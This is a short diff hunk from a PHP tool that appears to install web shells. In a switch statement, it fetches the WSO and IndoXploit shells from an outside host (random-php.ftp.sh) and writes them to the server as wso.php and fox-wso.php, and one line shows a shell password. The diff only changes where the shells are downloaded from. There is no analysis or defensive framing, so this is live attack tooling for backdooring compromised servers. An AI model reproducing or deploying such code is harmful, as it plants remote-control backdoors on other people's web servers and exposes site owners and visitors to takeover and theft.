@@ -1111,14 +1111,14 @@ case (op('indoxploit-v3.php', 'https://random-php.ftp.sh/idx-v3.txt')):
 case ('6'):
 switch (true)
 	{
-case (op('wso.php', 'https://raw.githubusercontent.com/qrtsir/shell/main/wp-login.txt')):
+case (op('wso.php', 'https://random-php.ftp.sh/wso.txt')):
 	$ok = '<strong>wso.php > </strong>ok! '.alt_ok().'pas: ghost287</div>';
 	}
 	break;
 case ('7'):
 switch (true)
 	{
-case (op('fox-wso.php', 'https://raw.githubusercontent.com/qrtsir/shell/main/wp-login.txt')):
+case (op('fox-wso.php', 'https://random-php.ftp.sh/fox-wso.txt')):
 	$ok = '<strong>fox-wso.php > </strong>ok! '.alt_ok().'</div>';
 	}
 }
